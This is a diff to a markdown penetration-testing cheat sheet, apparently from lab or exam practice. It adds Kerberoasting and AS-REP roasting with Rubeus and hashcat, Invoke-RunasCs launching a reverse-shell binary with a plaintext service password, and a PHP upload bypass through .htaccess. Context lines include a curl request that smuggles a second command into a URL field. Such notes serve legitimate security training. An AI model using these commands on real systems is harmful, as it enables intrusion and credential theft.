@@ -21,11 +21,14 @@
   - [pspy](#pspy)
   - [Cross Compiling](#cross-compiling)
   - [xfreerdp](#xfreerdp)
+  - [hashcat](#hashcat)
+  - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
 - [Web Attacks](#web-attacks)
   - [Local File Inclusion](#local-file-inclusion)
+  - [PHP File Upload Bypass](#php-file-upload-bypass)
 - [SMB](#smb)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -374,6 +377,29 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 xfreerdp /u:administrator /p:qwertyuiop /v:10.3.26.190:3333 /cert:ignore
 ```
 
+### hashcat
+```bash
+hashcat -h | grep -i "kerberos"
+# TGS-REP
+hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force
+```
+
+### Rubeus
+```bash
+# kerberoast
+./Rubeus.exe kerberoast /format:hashcat /outfile:mssql_hash
+
+# asreproast
+./Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
+```
+
+### Invoke-RunasCs.ps1
+```bash
+. .\Invoke-RunasCs.ps1
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
+```
+
 # SSH
 ## SSH Keygen
 - See if other users can login as root using ssh key
@@ -490,7 +516,13 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
 ```
 
-## SMB
+## PHP File Upload Bypass
+```bash
+echo "AddType application/x-httpd-php .xxx" > htaccess
+```
+
+
+# SMB
 ```bash
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
